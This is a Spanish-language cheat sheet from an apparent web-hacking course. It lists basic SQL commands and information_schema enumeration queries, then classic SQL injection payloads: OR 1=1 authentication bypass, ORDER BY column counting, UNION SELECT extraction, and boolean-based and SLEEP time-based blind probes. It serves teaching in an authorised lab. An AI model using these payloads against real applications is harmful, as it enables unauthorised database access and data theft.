# Comandos SQL / SQLi — Módulo 2

Referencia rápida de comandos útiles para explicar SQL, enumeración de bases y conceptos de SQL Injection en un entorno autorizado.

---

## Comandos SQL básicos

```sql
-- Listar bases de datos
SHOW DATABASES;

-- Elegir una base
USE curso_web_hacking;

-- Listar tablas de la base activa
SHOW TABLES;

-- Ver estructura resumida de una tabla
DESCRIBE users;

-- Ver columnas de una tabla
SHOW COLUMNS FROM users;

-- Ver algunos datos
SELECT * FROM users;

-- Limitar resultados
SELECT * FROM products LIMIT 5;

-- Filtrar datos
SELECT username, role
FROM users
WHERE role = 'admin';
```

---

## `information_schema` — qué es

`information_schema` es una base especial de MySQL/MariaDB que guarda **metadatos**:

- bases de datos disponibles,
- tablas por esquema,
- columnas por tabla,
- tipos de datos,
- privilegios y otra información estructural.

En SQLi aparece mucho porque permite **enumerar la estructura** antes de extraer datos concretos.

---

## Enumeración con `information_schema`

```sql
-- Listar tablas de una base
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'curso_web_hacking';

-- Listar columnas de una tabla
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'curso_web_hacking'
  AND table_name = 'users';

-- Listar columnas de todas las tablas de una base
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'curso_web_hacking'
ORDER BY table_name, ordinal_position;

-- Ver bases disponibles desde information_schema
SELECT schema_name
FROM information_schema.schemata;
```

---


## SQLi — payloads típicos

```sql
-- Buscar error / cambio de comportamiento
'

-- Bypass lógico
' OR '1'='1' --

-- Variante numérica
1 OR 1=1

-- Confirmación boolean-based
1 AND 1=1
1 AND 1=2
```


---

## SQLi — UNION SELECT

```sql
-- Detectar cantidad de columnas
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --

-- Probar UNION con NULLs
' UNION SELECT NULL,NULL,NULL --

-- Extraer contexto del motor
' UNION SELECT user(), database(), version() --

-- Enumerar tablas
' UNION SELECT table_name,NULL,NULL
FROM information_schema.tables --

-- Enumerar columnas de una tabla
' UNION SELECT column_name,NULL,NULL
FROM information_schema.columns
WHERE table_name='users' --
```

---

## SQLi — blind / time-based

```sql
-- Boolean-based
' AND SUBSTRING(database(),1,1)='c' --
' AND (SELECT COUNT(*) FROM users) > 1 --

-- Time-based en MySQL/MariaDB
' AND IF(database()='curso_web_hacking', SLEEP(5), 0) --
```


